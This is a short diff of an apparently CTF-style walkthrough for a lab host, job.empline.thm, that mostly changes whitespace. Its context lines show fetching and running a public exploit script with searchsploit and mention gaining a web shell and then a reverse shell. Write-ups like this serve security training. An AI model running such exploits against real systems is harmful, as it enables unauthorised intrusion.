@@ -81,8 +81,9 @@ searchsploit -m php/webapps/50585.sh
 chmod +x 50585.sh
 ./50585.sh http://job.empline.thm/
 ```
-<img width="1496" height="723" alt="image" src="https://github.com/user-attachments/assets/be0a54ad-f3f8-4f71-8f5a-5c6fc1ee96ba" />        
-Yeah, we got the web-shell, but to work better and comfortable I opened second terminal and made a reverse shell on there.           
+<img width="1496" height="723" alt="image" src="https://github.com/user-attachments/assets/be0a54ad-f3f8-4f71-8f5a-5c6fc1ee96ba" />   
+
+Yeah, we got the web-shell, but to work better and comfortable I opened second terminal and made a reverse shell on there.        
 
 ```bash
  # In my terminal
